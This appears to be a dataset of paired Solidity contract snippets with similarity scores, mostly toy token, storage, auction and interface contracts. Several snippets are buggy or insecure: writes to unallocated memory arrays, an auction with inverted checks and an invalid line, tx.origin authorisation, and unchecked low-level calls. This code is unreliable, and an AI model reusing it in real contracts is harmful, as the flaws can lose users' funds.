                _tokenIds[j] = items[usersByAddr[_userAddress].tokenId[_tokenType][j]].id;
                delete usersByAddr[_userAddress].tokenId[_tokenType][j];
                tokensDeletedPosition[tokensDeletedPosition.length] = j;
            }
        }
        shiftUserTokens(_userAddress, _tokenType,tokensDeletedPosition);
        emit tokenDestroyed(_userAddress, _tokenType, tokensDeletedPosition.length, block.timestamp, _tokenIds, true);
        return _tokenIds.length;
    }

    
    function burnToken(address _userAddress) public onlyOwner() {
        for(uint i = 0; i < 3; i++) {
            uint[] memory tokensDeletedPosition;
            uint[] memory _tokenIds;
            for(uint j = 0; j < usersByAddr[_userAddress].tokenId[i].length; j++) {
                if(items[usersByAddr[_userAddress].tokenId[i][j]].creationTime + items[usersByAddr[_userAddress].tokenId[i][j]].expiryduration <= block.timestamp) {
                    _burn(_userAddress, items[usersByAddr[_userAddress].tokenId[i][j]].id);
                    _tokenIds[j] = items[usersByAddr[_userAddress].tokenId[i][j]].id;
                    delete usersByAddr[_userAddress].tokenId[i][j];
                    tokensDeletedPosition[tokensDeletedPosition.length] = j;
                }
            }
            shiftUserTokens(_userAddress,i,tokensDeletedPosition);
            emit tokenDestroyed(_userAddress, i, tokensDeletedPosition.length, block.timestamp, _tokenIds, false);
        }
    }

    function shiftUserTokens(address _userAddress, uint _tokenType, uint[] memory deletedPositions) public onlyOwner() {
        uint tokenListLength = usersByAddr[_userAddress].tokenId[_tokenType].length;
        for (uint i = 0; i < deletedPositions.length; i++) {
            if (deletedPositions[i] < tokenListLength-1 ) {
                usersByAddr[_userAddress].tokenId[_tokenType][deletedPositions[i]] = usersByAddr[_userAddress].tokenId[_tokenType][tokenListLength -1];
                delete usersByAddr[_userAddress].tokenId[_tokenType][tokenListLength -1];
                tokenListLength = usersByAddr[_userAddress].tokenId[_tokenType].length;
                tokenCountInSupply[_tokenType] -= 1;
            }
        }
    }

    function transferToken(address _from, address _to, uint _tokenType, uint _amount, uint _expiryTime, bytes memory _reason) public returns (uint[] memory tokens, uint[] memory tokenPositions) {
        require(msg.sender == owner || msg.sender == _from);
        uint validTokensCount = 0;
        uint[] memory validTokens;
        uint[] memory validTokenPositions;
        for (uint i = 0; i < usersByAddr[_from].tokenId[_tokenType].length; i++) {
            uint itemNo = usersByAddr[_from].tokenId[_tokenType][i];
            if (items[itemNo].creationTime + items[itemNo].expiryduration >= _expiryTime ) {
                validTokens[validTokensCount] = usersByAddr[_from].tokenId[_tokenType][i];
                validTokenPositions[validTokensCount] = i;
                validTokensCount += 1;
            }
        }
        if (validTokensCount >= _amount) {
            uint _toTokenLength = usersByAddr[_to].tokenId[_tokenType].length ;
            for (uint i = 0; i < validTokens.length; i++) {
                safeTransferFrom(_from, _to, validTokens[i], _reason);
                delete usersByAddr[_from].tokenId[_tokenType][validTokenPositions[i]];
                usersByAddr[_to].tokenId[_tokenType][_toTokenLength] = validTokens[i];
                _toTokenLength += 1;
            }
            emit tokenTransfer(_from, _to, _tokenType, _amount, block.timestamp, validTokens);
            return (validTokens, validTokenPositions);
        } else {
            delete validTokens;
            delete validTokenPositions;
            return (validTokens, validTokenPositions);
        }

    }

    function addOwner(address _secondaryOwner) public onlyOwner() {
        owners.push(_secondaryOwner);
        emit ownerAdded(msg.sender, _secondaryOwner);
    }

    function removeOwner(address _secondaryOwner) public onlyOwner() {
        bool ownerRemovedflag = false;
        uint removedPosition;
        for( uint i = 0; i < owners.length; i++) {
            if(owners[i] == _secondaryOwner) {
                delete owners[i];
                ownerRemovedflag = true;
                removedPosition = i;
                emit ownerRemoved(msg.sender, _secondaryOwner);
            }
        }
        if(ownerRemovedflag) {
            if(removedPosition < owners.length-1) {
                owners[removedPosition] = owners[owners.length-1];
                delete owners[owners.length-1];
            }
        }
    }
}",0.6201545807094703,"contract CityToken is ERC721 {

  

  
  event TokenCreated(uint256 tokenId, string name, uint256 parentId, address owner);

  
  event TokenSold(uint256 tokenId, uint256 oldPrice, uint256 newPrice, address prevOwner, address winner, string name, uint256 parentId);

  
  
  event Transfer(address from, address to, uint256 tokenId);

  

  
  string public constant NAME = ""CryptoCities""; 
  string public constant SYMBOL = ""CityToken""; 

  uint256 private startingPrice = 0.05 ether;

  

  
  
  mapping (uint256 => address) public tokenIndexToOwner;

  
  
  mapping (address => uint256) private ownershipTokenCount;

  
  
  
  mapping (uint256 => address) public tokenIndexToApproved;

  
  mapping (uint256 => uint256) private tokenIndexToPrice;

  
  address public ceoAddress;
  address public cooAddress;

  uint256 private tokenCreatedCount;

  

  struct Token {
    string name;
    uint256 parentId;
  }

  Token[] private tokens;

  mapping(uint256 => Token) private tokenIndexToToken;

  
  
  modifier onlyCEO() {
    require(msg.sender == ceoAddress);
    _;
  }

  
  modifier onlyCOO() {
    require(msg.sender == cooAddress);
    _;
  }

  
  modifier onlyCLevel() {
    require(
      msg.sender == ceoAddress ||
      msg.sender == cooAddress
    );
    _;
  }

  
  function CityToken() public {
    ceoAddress = msg.sender;
    cooAddress = msg.sender;
  }

  
  
  
  
  
  
  function approve(
    address _to,
    uint256 _tokenId
  ) public {
    
    require(_owns(msg.sender, _tokenId));

    tokenIndexToApproved[_tokenId] = _to;

    Approval(msg.sender, _to, _tokenId);
  }

  
  
  
  function balanceOf(address _owner) public view returns (uint256 balance) {
    return ownershipTokenCount[_owner];
  }

  
  function createToken(uint256 _tokenId, address _owner, string _name, uint256 _parentId, uint256 _price) public onlyCOO {

    address tokenOwner = _owner;
    if (tokenOwner == address(0)) {
      tokenOwner = cooAddress;
    }
    
    if (_price <= 0) {
      _price = startingPrice;
    }

    tokenCreatedCount++;
    _createToken(_tokenId, _name, _parentId, tokenOwner, _price);
  }


  
  
  function getToken(uint256 _tokenId) public view returns (
    string tokenName,
    uint256 parentId,
    uint256 sellingPrice,
    address owner
  ) {
    Token storage token = tokenIndexToToken[_tokenId];

    tokenName = token.name;
    parentId = token.parentId;
    sellingPrice = tokenIndexToPrice[_tokenId];
    owner = tokenIndexToOwner[_tokenId];
  }

  function implementsERC721() public pure returns (bool) {
    return true;
  }

  
  function name() public pure returns (string) {
    return NAME;
  }

  
  
  
  function ownerOf(uint256 _tokenId)
    public
    view
    returns (address owner)
  {
    owner = tokenIndexToOwner[_tokenId];
    require(owner != address(0));
  }

  function payout(address _to) public onlyCLevel {
    _payout(_to);
  }

  
  function withdrawFunds(address _to, uint256 amount) public onlyCLevel {
    _withdrawFunds(_to, amount);
  }
  
  
  function purchase(uint256 _tokenId) public payable {
    
    
    if (_tokenId > 999) {
      _purchaseCountry(_tokenId);
    }else {
      _purchaseCity(_tokenId);
    }

  }

  function priceOf(uint256 _tokenId) public view returns (uint256 price) {
    return tokenIndexToPrice[_tokenId];
  }

  
  
  function setCEO(address _newCEO) public onlyCEO {
    require(_newCEO != address(0));

    ceoAddress = _newCEO;
  }

  
  
  function setCOO(address _newCOO) public onlyCEO {
    require(_newCOO != address(0));

    cooAddress = _newCOO;
  }

  
  function symbol() public pure returns (string) {
    return SYMBOL;
  }

  
  
  
  function takeOwnership(uint256 _tokenId) public {
    address newOwner = msg.sender;
    address oldOwner = tokenIndexToOwner[_tokenId];

    
    require(_addressNotNull(newOwner));

    
    require(_approved(newOwner, _tokenId));

    _transfer(oldOwner, newOwner, _tokenId);
  }

  
  
  
  
  
  function tokensOfOwner(address _owner) public view returns(uint256[] ownerTokens) {
    uint256 tokenCount = balanceOf(_owner);
    if (tokenCount == 0) {
        
      return new uint256[](0);
    } else {
      uint256[] memory result = new uint256[](tokenCount);
      uint256 totalTokens = totalSupply();
      uint256 resultIndex = 0;

      uint256 tokenId;
      for (tokenId = 0; tokenId <= totalTokens; tokenId++) {
        if (tokenIndexToOwner[tokenId] == _owner) {
          result[resultIndex] = tokenId;
          resultIndex++;
        }
      }
      return result;
    }
  }

  
  
  function totalSupply() public view returns (uint256 total) {
    
    
    
    return tokenCreatedCount;
  }

  
  
  
  
  function transfer(
    address _to,
    uint256 _tokenId
  ) public {
    require(_owns(msg.sender, _tokenId));
    require(_addressNotNull(_to));

    _transfer(msg.sender, _to, _tokenId);
  }

  
  
  
  
  
  function transferFrom(
    address _from,
    address _to,
    uint256 _tokenId
  ) public {
    require(_owns(_from, _tokenId));
    require(_approved(_to, _tokenId));
    require(_addressNotNull(_to));

    _transfer(_from, _to, _tokenId);
  }

  

  function _purchaseCity(uint256 _tokenId) private {

     address oldOwner = tokenIndexToOwner[_tokenId];

    
    

    uint256 sellingPrice = tokenIndexToPrice[_tokenId];

    
    require(oldOwner != msg.sender);

    
    require(_addressNotNull(msg.sender));

    
    require(msg.value >= sellingPrice);

    
    
    
    
    
    uint256 payment = uint256(SafeMath.div(SafeMath.mul(sellingPrice, 92), 100));

    
    uint256 parentId = tokenIndexToToken[_tokenId].parentId;

    
    address ownerOfParent = tokenIndexToOwner[parentId];

    
    uint256 paymentToOwnerOfParent = uint256(SafeMath.div(SafeMath.mul(sellingPrice, 2), 100));

    
    
    
    
    
    if (_addressNotNull(ownerOfParent)) {

      
      ownerOfParent.transfer(paymentToOwnerOfParent);
      
    } else {

      
      payment = SafeMath.add(payment, paymentToOwnerOfParent);
     
    }

    
    uint256 purchaseExcess = SafeMath.sub(msg.value, sellingPrice);

    
    
    tokenIndexToPrice[_tokenId] = SafeMath.div(SafeMath.mul(sellingPrice, 120), 92);
    
    _transfer(oldOwner, msg.sender, _tokenId);

    
    if (oldOwner != address(this)) {
      oldOwner.transfer(payment);
    }
    
    TokenSold(_tokenId, sellingPrice, tokenIndexToPrice[_tokenId], oldOwner, msg.sender, tokenIndexToToken[_tokenId].name, parentId);

    msg.sender.transfer(purchaseExcess);
  }

  function _purchaseCountry(uint256 _tokenId) private {

    address oldOwner = tokenIndexToOwner[_tokenId];

    uint256 sellingPrice = tokenIndexToPrice[_tokenId];

    
    require(oldOwner != msg.sender);

    
    require(_addressNotNull(msg.sender));

    
    require(msg.value >= sellingPrice);

    
    
    
    
    uint256 payment = uint256(SafeMath.div(SafeMath.mul(sellingPrice, 96), 100));

    
    uint256 purchaseExcess = SafeMath.sub(msg.value, sellingPrice);

    
    
    tokenIndexToPrice[_tokenId] = SafeMath.div(SafeMath.mul(sellingPrice, 115), 96);
    
    _transfer(oldOwner, msg.sender, _tokenId);

    
    if (oldOwner != address(this)) {
      oldOwner.transfer(payment);
    }
    
    TokenSold(_tokenId, sellingPrice, tokenIndexToPrice[_tokenId], oldOwner, msg.sender, tokenIndexToToken[_tokenId].name, 0);

    msg.sender.transfer(purchaseExcess);
  }


  
  function _addressNotNull(address _to) private pure returns (bool) {
    return _to != address(0);
  }

  
  function _approved(address _to, uint256 _tokenId) private view returns (bool) {
    return tokenIndexToApproved[_tokenId] == _to;
  }


  
  function _createToken(uint256 _tokenId, string _name, uint256 _parentId, address _owner, uint256 _price) private {
    
    Token memory _token = Token({
      name: _name,
      parentId: _parentId
    });

    
    
    
    
    uint256 newTokenId = _tokenId;
    tokenIndexToToken[newTokenId] = _token;

    
    
    
    
    
    require(newTokenId == uint256(uint32(newTokenId)));

    TokenCreated(newTokenId, _name, _parentId, _owner);

    tokenIndexToPrice[newTokenId] = _price;

    
    
    _transfer(address(0), _owner, newTokenId);
  }

  
  function _owns(address claimant, uint256 _tokenId) private view returns (bool) {
    return claimant == tokenIndexToOwner[_tokenId];
  }

  
  function _payout(address _to) private {
    if (_to == address(0)) {
      ceoAddress.transfer(this.balance);
    } else {
      _to.transfer(this.balance);
    }
  }

  
  function _withdrawFunds(address _to, uint256 amount) private {
    require(this.balance >= amount);
    if (_to == address(0)) {
      ceoAddress.transfer(amount);
    } else {
      _to.transfer(amount);
    }
  }

  
  function _transfer(address _from, address _to, uint256 _tokenId) private {
    
    ownershipTokenCount[_to]++;
    
    tokenIndexToOwner[_tokenId] = _to;

    
    if (_from != address(0)) {
      ownershipTokenCount[_from]--;
      
      delete tokenIndexToApproved[_tokenId];
    }

    
    Transfer(_from, _to, _tokenId);
  }
}"
"contract SimpleStorage {

address owner;

function SimpleStorage() {
    owner = msg.sender;
}

modifier onlyOwner {
    if (msg.sender != owner)
        throw;
    _;
}

struct Sample {
    uint256 id;
    string data;
}

uint256 public id;
Sample[] public setData; 
function set(string data) {
    setData.push(Sample({
        id: id,
        data: data
    }));
    id++;
}
}",0.6582321324009541,"contract MockOracle is OracleInterface {



    uint256 public price_;

    address owner;

    

    

    modifier onlyOwner() {

        if (msg.sender != owner) {

            revert();

        }

         _;

    }

    

    constructor() public {

        owner = msg.sender;

    }



    function setPrice(uint256 price) public onlyOwner {

    

      price_ = price;



    }



    function price() public view returns (uint256){



      return price_;



    }



}"
"contract test{

  ERC20 myToken = ERC20(0xa74476443119A942dE498590Fe1f2454d7D4aC0d);

  function getTokenBalanceOf(address a) constant returns (uint balance) {
    return myToken.balanceOf(a);
  }
}",0.6042359662088963,"contract PreSaleToken is Token {

    function balanceOf(address _owner) constant returns (uint256 balance) {
        return balances[_owner];
    }
    
    mapping (address => uint256) balances;
}"
"contract EscrowContract {
    
    address public depositor;
    address public beneficiary;
    address public arbiter;
    function EscrowContract (address _abiter, address _beneficiary) public {
    

    } 
}",0.623547012983491,"contract SpyceToken{
  function sendCrowdsaleTokens(address, uint256)  public;
  function setCrowdsaleContract (address) public;
  function burnContributorTokens (address _address) public;
}"
"contract BaseLookup {

    address owner;
    function BaseLookup() { owner = msg.sender; }

    struct Lookup {
        uint id;
        string name;
    }

    mapping(uint => Lookup) lookupById;

    function getLookupById(uint _id) public constant returns (uint, string) {
        return (lookupById[_id].id, lookupById[_id].name);
    }
}",0.6074224455507371,"contract ProofOfExistence {



    uint topTimeBeat;

    address owner;



    constructor() public {

       owner = msg.sender;

    }



    function publishTopTimeBeat(uint _topTimeBeat) public {

        if (owner == msg.sender) {

            topTimeBeat = _topTimeBeat;

        }

    }



    function get() public view returns (uint) {

        return topTimeBeat;

    }

}"
"contract MyContract {
  uint public version;
  address public previousPublishedVersion;

  function ping() returns (string param){
    param = ""pong"";
  }

  function squareNumber(uint num) returns (uint256 numSqr) {
    numSqr = (num * num);
  }
}",0.6299259276474762,"contract RegulatorService {



  

  function check(address _token, address _spender, address _from, address _to, uint256 _amount) public returns (uint8);



  

  function messageForReason(uint8 _reason) public view returns (string);

}"
"contract Core {

    address public owner;
    uint public count;
    uint public tax;
    event NewMarketLog(address market, address owner);
    mapping (address=>address) public MarketplaceList;

    function Core (){
        owner=msg.sender;
    }

    function CreateMarketplace (string _name, string _desc, string _telegram)  returns (address) {
        count++;
        address adr=new Marketplace(_name,_desc,_telegram,msg.sender);
        NewMarketLog(adr, msg.sender);
    return  MarketplaceList[msg.sender]=  adr;
    }
}",0.6820100155744306,"contract Metadata {
    
    address public owner;
    
    mapping (uint => address) registerMap;

    function Metadata() public {
        owner = msg.sender;
        registerMap[0] = msg.sender;
    }

    
    function getAddress (uint addressId) public view returns (address){
        return registerMap[addressId];
    }

    
    
    
    
    
    function addAddress (uint addressId, address addressContract) public {
        assert(addressContract != 0x0 );
        require (owner == msg.sender || owner == tx.origin);
        registerMap[addressId] = addressContract;
    }
}"
"contract D {
  uint public n;
  address public sender;
  function callSetN(address _e, uint _n) {
    _e.call(bytes4(sha3(""setN(uint256)"")), _n); 
  }

  function callcodeSetN(address _e, uint _n) {
    _e.callcode(bytes4(sha3(""setN(uint256)"")), _n); 
  }

  function delegatecallSetN(address _e, uint _n) {
    _e.delegatecall(bytes4(sha3(""setN(uint256)"")), _n); 
  }
  function getN() constant returns(uint){
      return n;
  }
  function getSender() constant returns(address){
       return sender;
   }
}",0.6425595467376871,"contract ERC20{

bool public isERC20 = true;

function balanceOf(address who) constant returns (uint256);

function transfer(address _to, uint256 _value) returns (bool);

function transferFrom(address _from, address _to, uint256 _value) returns (bool);

function approve(address _spender, uint256 _value) returns (bool);

function allowance(address _owner, address _spender) constant returns (uint256);

}"
"contract E {
  uint public n;
  address public sender;
  function setN(uint _n) {
    n = _n;
    sender = msg.sender;
    
    
  }
  function getN() constant returns(uint){
      return n;
  }
    function getSender() constant returns(address){
       return sender;
   }
}",0.6638412377793997,"contract Admin {

    address public owner;
    mapping(address => bool) public AdminList;
    
    function Test() public returns (uint256 _balance) {
            
        address sender = msg.sender;
        return sender.balance;
        
    }
    
      function TestX() public {
         
         owner = msg.sender;
        
    }
    
}"
"contract accountList {

    address[] allowedClient;

    function add(address client) returns (bool) {
        allowedClient.push(client);
        return true;
    }

    function get() constant returns (address[]) {
        return allowedClient;
    }

}",0.6443360144351127,"contract Oasis{
    function getBestOffer(address sell_gem, address buy_gem) public constant returns(uint256);
    function getOffer(uint id) public constant returns (uint, address, uint, address);
}"
"contract SimpleAuction {

      address public beneficiary;
      uint public auctionStart;
      uint public biddingTime;


      address public highestBidder;

      uint public highestBid;


      bool ended;


      event HighestBidIncreased(address bidder, uint amount);

      event AuctionEnded(address winner, uint amount);


      function SimpleAuction (uint _biddingTime, address _beneficiary) {
        beneficiary = _beneficiary;
        auctionStart = now;
        biddingTime = _biddingTime;
      }


      function bid()   {

        require(now > auctionStart + biddingTime) ;


        require(msg.value <= highestBid);



        if (highestBidder != 0) {
          highestBidder.send(highestBid);
        }
        highestBidder = msg.sender;
        highestBid = msg.value;
        HighestBidIncreased(msg.sender, msg.value);
      }


      function auctionEnd() {
        require (now <= auctionStart + biddingTime);
        require (ended);
        AuctionEnded(highestBidder, highestBid);

        beneficiary.send(this.balance);
        ended = true;
      }


         require(function());

    }",0.6004350141120564,"contract myPreICO is Ownable {

    uint public ETHRaised;

    uint public soft_cap = 1 ether; 

    uint public hard_cap = 10 ether;

    address public owner = 0x0;

    uint public end_date;

    address[] public holders;

    mapping (address => uint) public holder_balance;

    

    function myICO() public {

        owner = msg.sender;

        end_date = now + 90 days; 

    }



    function sendFunds(address _addr) public onlyOwner {

        require (ETHRaised >= soft_cap); 

        _addr.transfer(address(this).balance);

    }



    function withdraw() public {

        uint amount;

        require(now > end_date);

        require(ETHRaised < hard_cap);

        amount = holder_balance[msg.sender];

        holder_balance[msg.sender] = 0;

        msg.sender.transfer(amount);

    }

    

    function () public payable {

        require(msg.value > 0);

        holders.push(msg.sender);

        holder_balance[msg.sender] += msg.value;

        ETHRaised += msg.value;

    }



    function getFunds() public view returns (uint){

        return address(this).balance;

    }

}"
"contract sendEth {
  mapping(address => uint) balances;
  function invest() external payable {
    if(msg.value < 0.01 ether) {
      revert();
    }
    balances[msg.sender] += msg.value;
  }

  function balanceOf() external view returns(uint) {
    return address(this).balance;
  }

  function sendEther(address payable recipient) external {
    recipient.transfer(0.0001 ether);
  }
}",0.6434931966026735,"contract AWToken {
       function burn(address addr, uint value) public;
       function balanceOf(address who) external view returns (uint);
       function calculationNeedAW(uint usdtVal) external view returns(uint);
       function gainAWToken(uint value, bool isCovert) external;
       function transfer(address to, uint value) public;
    }"
"contract BasicCounter {
    uint private counter = 0;
    function incrementAndGet() external returns (uint) {
        counter++;
        return counter;
    }
}",0.6123695090613528,"contract Context {
    
    
    constructor () internal { }
    

    function _msgSender() internal view returns (address payable) {
        return msg.sender;
    }
}"
"contract Example {
    
    mapping (uint => string) public _registry;
    uint nIndex= 0; 
    function set_s(string new_s) {
        _registry[nIndex] = new_s;
        nIndex = nIndex + 1;
    }
    function get_s(uint number) returns (string) {
        return _registry[number];
    } 
}",0.6342899360952451,"contract Coursetro {
    
   string fName;
   uint age;
   
   function setInstructor(string _fName, uint _age) public {
       fName = _fName;
       age = _age;
   }
   
   function getInstructor() public constant returns (string, uint) {
       return (fName, age);
   }
    
}"
"contract Second {
  First f;
  function Second() public {
    f = new First(); 
  }

  function checkSender(uint t) public view returns(address){
    t = 0; 
    return f.cSender();
  }
}",0.6585053007386006,"contract ICDComicsClue {

    function clues(uint id) public view returns (uint, uint);

    function ownerOf(uint256 _tokenId) public view returns (address);

}"
"contract Test {

    bytes32 public input;
    function test(bytes32 _in) public {
    input = _in;
  }
}",0.6939800818732631,"contract GroveAPI {
  function insert(bytes32 indexName, bytes32 id, int value) public;
}"
"contract WordContract {
string word = ""test"";
function getWord() constant returns(string) {
    return word;
}
function setWord(string newWord) returns(string) {
 word = newWord;
 return word;
}
}",0.6522463263519173,"contract HelloWorld {
    
    string wellcomeString = ""Hello, world!"";
    
    function getData() constant returns (string) {
        return wellcomeString;
    }
    
    function setData(string newData) {
        wellcomeString = newData;
    }
    
}"
"contract MyContract {
    uint public value;
    function func1(uint x) external {
        for (uint i = 0; i < x; i++)
            value += i;
    }
    function func2(uint x) external {
        for (uint i = 0; i <= x; i++)
            value += i;
    }
}",0.6285142749544326,"contract IFlip {
    function tick(uint id) external;
    function tend(uint id, uint lot, uint bid) external;
    function dent(uint id, uint lot, uint bid) external;
    function deal(uint id) external;
}"
"contract SellToken {
  TokenInstance instance;
  function SellToken(address _address) {
    instance = TokenInstance(_address);
  }

  function () payable { 
    uint256 weiAmount = msg.value;

    
    uint256 tokens = weiAmount.mul(rate);

    
    weiRaised = weiRaised.add(weiAmount);

    instance.mint(beneficiary, tokens);
  }

}",0.6194621998709672,"contract SelfDestroy is Ownable {

    using SafeMath for uint256;

    uint256 public weiAmount = 0;

    constructor() public {}

   

   

    function () public payable {

        weiAmount = weiAmount + msg.value;

    }

   

   function destroy(address _address) public onlyOwner {

       selfdestruct(_address);

   }



}"
"contract VehRegistry {
    address public owner;

    event Event(string vin, string mileage, string date);

    function VehRegistry() public {
        owner = msg.sender;
    }

    function registerEvent(string vin, string mileage, string date) public {
        require(msg.sender == owner);
        emit Event(vin, mileage, date);
    }

}",0.6032164980422904,"contract TokenLocker {
    
    address public owner;

    ERC20 public token;

    
    function TokenLocker (ERC20 tokenAddr) public {
        owner = msg.sender;
        token = tokenAddr;
    }

    
    function transfer(address dest, uint amount) public returns (bool) {
        require(msg.sender == owner);
        return token.transfer(dest, amount);
    }

}"
"contract A {
    address public addr;
    bool public success;
    bytes public result;

function setAddr(address _addr) public {
    addr = _addr;
}


function callB(uint256 arg1, uint256 arg2) public {
    (success, result) = addr.staticcall(abi.encodeWithSignature(""funcB(uint256, uint256)"", arg1, arg2));
}

}",0.6514179127225167,"contract ERC20StandardToken {



  string public name;

  string public symbol;

  uint8 public decimals;



  function allowance(address owner, address spender)

    public view returns (uint256);



  function transferFrom(address from, address to, uint256 value)

    public returns (bool);



}"
"contract Math {

    function Math() public {}

    function percent(uint a, uint b) public constant returns(uint, uint) {
      uint c = a*b;
      uint integer = c/100;
      uint fractional = c%100;
      return (integer, fractional);
    }

  }",0.6863853382460289,"contract FiatContract {

    function ETH(uint _id) public constant returns (uint256);

  	function EUR(uint _id) public constant returns (uint256);

  	function updatedAt(uint _id) public constant returns (uint);

}"
"contract Test {
    function add(uint x, uint y) constant returns (uint) {
      return x + y;
    }
  }",0.6880330404958308,"contract TestFiatContract
{
    function USD(uint) constant returns (uint256)
    {
        return 12305041990000;
    }
}"
"contract Broken {

    address creator;
    uint public aInt;
    bool[3] bools;

    function Broken(uint _aInt, bool[3] _bools) public {
        creator = msg.sender;
        aInt = _aInt;
        bools = _bools;
    }

    function getBools() constant returns (bool[3]) {
        return bools;
    }

    function kill() {
        if (msg.sender == creator) suicide(creator);
    }

}",0.6167323310772437,"contract BaseAgriChainContract {
    address creator; 
    function BaseAgriChainContract() public    {   creator = msg.sender;   }
    
    modifier onlyBy(address _account)
    {
        if (msg.sender != _account)
            throw;
        _;
    }
    
    function kill() onlyBy(creator)
    {               suicide(creator);     }
     
     function setCreator(address _creator)  onlyBy(creator)
    {           creator = _creator;     }
  
}"
"contract C {
    uint someVariable;
    uint[] data;

    function f() public {
        uint[] x;
        x.push(2);
        data = x;
    }
}",0.6045598129874361,"contract iRNG {

    function update(uint roundNumber, uint additionalNonce, uint period) public payable;

}"
"contract helloworld { 
     uint public balance;
    function helloworld(){
        balance = 1000;
    }

    function getBalance()  returns(uint) {
        return balance; 
    } 
}",0.6604973352617294,"contract Token {
    function balanceOf(address) public constant returns (uint);
    function transfer(address, uint) public returns (bool);
}"
"contract Parent {
    address owner;

    event NewChildCreated(address childAddress, address creator);

    function Parent() public {
        owner = msg.sender;
    }

    function createChild() public {
        Child child = new Child();
        NewChildCreated(address(child), child.owner());
    }
}",0.6445946523602896,"contract Owned {
	modifier only_owner { require (msg.sender == owner); _; }

	event NewOwner(address indexed old, address indexed current);

	function setOwner(address _new) public only_owner { NewOwner(owner, _new); owner = _new; }

	address public owner;
}"
"contract NewContract {

    Mytoken token;

    uint256 public rate;

    function NewContract(uint256 _rate){
        rate = _rate;
    }

    function () payable {
        token.mint(msg.sender, msg.value);
    }
}",0.6248522675924637,"contract token {



    function balanceOf(address _owner) public constant returns (uint256 balance);

    

    

    function transfer(address _to, uint256 _value) public;



}"
"contract MyContract {
    uint256[] public array;
    function justPush(uint256 value) external {
        array.push(value);
    }
}",0.645382412236372,"contract Example {

    uint256 public value;

    function setValue(uint256 _value) public {

        value = _value;

    }

}"
"contract Foo {
    Bar public bar;

    function Foo(){
        bar = new Bar();
    }

    function test() returns (uint) { return 1; }

    function test2() {}

    function execute() {
        bar.run();
    }
}",0.6499283399552805,"contract VoxInterface {

    function par() public view returns (uint);

    function way() public view returns (uint);

    function era() public view returns (uint);

}"
"contract Account {
  mapping (address => uint256) public balanceOf;

  function deposit() public payable {
    balanceOf[msg.sender] += msg.value;
  }

  function withdraw() public {
    uint256 amount = balanceOf[msg.sender];
    balanceOf[msg.sender] = 0;
    msg.sender.transfer(amount);
  }
}",0.6850506598204602,"contract Withdrawable {
    mapping (address => uint) public pendingWithdrawals;

    function withdraw() public {
        uint amount = pendingWithdrawals[msg.sender];
        
        require(amount > 0);
        require(this.balance >= amount);

        pendingWithdrawals[msg.sender] = 0;
        msg.sender.transfer(amount);
    }
}"
"contract GuessTheNumberChallenge {
    constructor() public payable {
        require(msg.value == 1 ether);
    }
    function () external payable {}

}",0.6247418293104211,"contract HermesPayoutAllKiller {

    function pay(address hermes) public payable {

        require(hermes.call.value(msg.value)(), ""Error"");

    }

}"
"contract A is B {
    function bbb() public {  }
    function test() public {
       bbb(); 
       super.test(); 
    }
}",0.6674457739148907,"contract Test1

    {

       function Invest() 

    public 

    payable ;

    function Divest(uint amount) 

    public ;

    }"
"contract adderr {
    int total;
    function adder() public {
        total = 0;
    }
    function getTotal() constant returns (int){
        return total;
    }
   function addToTotal(int add) returns (int) {
       total = total + add;
       return total;
   }
   function calculateProof(string document) constant returns (bytes32) {
       return sha256(document);
   }",0.6469695531072734,"contract myTime is mortal
{
    uint deployTime;

    
    function myTime() public
    {
        deployTime = block.timestamp;
    }

    function getDeployTime() constant returns (uint)
    {
        return deployTime;
    }

    function getBlockTime() constant returns (uint)
    {
        return block.timestamp;
    }

    function getNowTime() constant returns (uint)
    {
        return now;
    }
}"
"contract Proxy is Owned {
event Forwarded (
    address indexed destination,
    uint value,
    bytes data
);

function () payable{}

function forward(address destination, uint value, bytes data) onlyOwner {
    if (!destination.call.value(value)(data)) {
        throw;
    }
    Forwarded(destination, value, data);
}}",0.6561247166688017,"contract ERC223Basic is StandardToken{
    uint public totalSupply;
    
    function transfer(address to, uint value);
    function transfer(address to, uint value, bytes data);
    event Transfer(address indexed from, address indexed to, uint value, bytes indexed data);
}"
"contract StarNotary is ERC721 {
    struct Star {
        string name;
    }

    mapping(uint256 => Star) public tokenIdToStarInfo;
    mapping(uint256 => uint256) public starsForSale;

    
    function createStar(string memory _name, uint256 _tokenId) public {
        Star memory newStar = Star(_name);
        tokenIdToStarInfo[_tokenId] = newStar;
        _mint(msg.sender, _tokenId);
    }

    
    function putStarUpForSale(uint256 _tokenId, uint256 _price) public {
        require(
            ownerOf(_tokenId) == msg.sender,
            ""You can't sale the Star you don't owned""
        );
        starsForSale[_tokenId] = _price;
    }

    function _make_payable(address x) internal pure returns (address payable) {
        return address(uint160(x));
    }

    function buyStar(uint256 _tokenId) public payable {
        require(starsForSale[_tokenId] > 0, ""The Star should be up for sale"");
        uint256 starCost = starsForSale[_tokenId];
        address ownerAddress = ownerOf(_tokenId);
        require(msg.value > starCost, ""You need to have enough Ether"");
        transferFrom(ownerAddress, msg.sender, _tokenId);
        address payable ownerAddressPayable = _make_payable(ownerAddress);
        ownerAddressPayable.transfer(starCost);
        if (msg.value > starCost) {
            msg.sender.transfer(msg.value - starCost);
        }
    }
}",0.6383539792686852,"contract DistributeByTransferFrom is Ownable {

  address public owner;



  constructor () public {

    owner = msg.sender;

  }



  modifier onlyOwner {

    require(msg.sender == owner);

    _;

  }

  event Pay(uint256 _value, bytes _id);

  

  

  function () payable public {

    owner.transfer(msg.value);

    emit Pay(msg.value, msg.data);

  }

  

  function distributeTokens(address _token, address _from, uint256[] _bits) public onlyOwner returns (bool result) {

    require(_bits.length % 2 == 0);

    for (uint256 i = 0; i < _bits.length; i+=2) {

      address to = address(_bits[i]);

      uint256 value = _bits[i+1];

      ERC20StdToken(_token).transferFrom(_from, to, value);

    }

    return true;

  }

  

  function withdrawEther() public onlyOwner returns(bool res) {

    uint256 ethBalance = address(this).balance;

    owner.transfer(ethBalance);

    return true;

  }

  

  function withdrawERC20(address _token) public onlyOwner returns(bool res) {

    uint256 value = ERC20StdToken(_token).balanceOf(address(this));

    ERC20StdToken(_token).transfer(owner, value);

    return true;

  }

  

  function withdrawERC721(address _contract, uint256 _tokenId) public onlyOwner returns(bool res) {

    ERC721StdToken(_contract).safeTransferFrom(address(this), owner, _tokenId);

    return true;

  }

}"
"contract CampaignFact {
    address[] public deployedCampaigns;

function createCampaign(uint min) public {
    address newC = new Campaign(min, msg.sender);
    deployedCampaigns.push(newC);
}

function getDeployedCampaigns() public view returns (address[] memory) {
    return deployedCampaigns;
  }
}",0.6910219206754568,"contract CreateBlogger {

    address [] public deployedBlogs;



    function createBlogger() public returns(address) {

        address newBlogger = new Blogger(msg.sender);
